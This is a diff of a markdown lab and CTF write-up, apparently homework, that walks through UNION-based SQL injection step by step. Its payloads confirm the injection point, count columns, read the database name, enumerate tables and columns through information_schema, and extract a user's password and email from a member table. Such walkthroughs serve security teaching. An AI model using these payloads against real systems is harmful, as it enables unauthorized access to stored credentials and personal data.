@@ -86,16 +86,17 @@ The names of the coulmns in **member** table are **user_id, user_pass,	name, use
 1234' union select id, pass, email, info from member #
 ```
 
-For getting only doldol's data we fix the payload
+To extract only **doldol**'s data, modify the payload as follows:
+
 ```
 ' union select id, pass, email, info from member where id='doldol' #
 ```
 
-Result:
+**Result:**
 
 ![image](https://github.com/user-attachments/assets/dbda74c3-e0f9-4c40-a20f-c9cc8297b36b)
 
-
+Success!
 
 
 
@@ -104,10 +105,43 @@ Result:
 
 # Assignment 6 - 2 / CTF SQL Injection 1
 
+Find the SQL Injection point
+```
+bello' or '1'='1 
+```
+![image](https://github.com/user-attachments/assets/2ac94953-e134-442e-9fca-c7f255916af6)
 
 
 
+The number of columns is 4
+```
+bello' order by [num] #
+```
+![image](https://github.com/user-attachments/assets/68c8e490-72c7-41a5-a08e-807ece73ef22)
 
+
+
+Name of Databse: sqli_1
+```
+bello' union select database(), 2 ,3 ,4 #
+```
+![image](https://github.com/user-attachments/assets/07c57dd6-43f3-4e5f-bcf1-78c98badbcc9)
+
+
+
+Find the tables in Database
+```
+' union select table_name, 2, 3 ,4 from information_schema.tables where table_schema = 'sqli_1' #
+```
+![image](https://github.com/user-attachments/assets/bff2111c-d1cf-49d2-9863-ef79d7211b3a)
+
+
+
+Find the coulmns in **Flag** table
+```
+' union select column_name, 2, 3 ,4 from information_schema.columns where table_name = 'flag_table' #
+```
+![image](https://github.com/user-attachments/assets/e029b62d-99b6-421d-82cd-3fe6ed6ed37e)
 
 
 
